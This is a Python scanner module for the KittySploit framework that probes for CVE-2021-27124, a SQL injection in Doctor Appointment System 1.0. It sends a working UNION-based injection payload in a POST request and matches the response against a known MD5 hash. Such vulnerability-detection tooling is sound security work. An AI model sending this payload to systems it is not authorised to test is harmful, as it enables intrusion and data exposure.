#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL injection in the expertise parameter in search_result."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Doctor Appointment System 1.0 - SQL Injection Detection',
        'description': 'SQL injection in the expertise parameter in search_result.php in Doctor Appointment System v1.0.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve2021',
            'cve',
            'packetstorm',
            'sqli',
            'doctor-appointment-system',
            'doctor_appointment_system_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.sourcecodester.com/php/14182/doctor-appointment-system.html',
            'https://packetstormsecurity.com/files/161342/Doctor-Appointment-System-1.0-SQL-Injection.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27124',
        ],
        'cve': 'CVE-2021-27124',
    }

    def run(self):
        path = '/patient/search_result.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="expertise=Heart'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,md5('999999999'),NULL,NULL,NULL,NULL,NULL,NULL--+-&submit=\n")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('c8c605999f3d8352d7bb792cf3fdb25b', 'Doctor Appoinment System',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Doctor Appointment System 1.0 - SQL Injection detected', path=path)
            return True
        return False

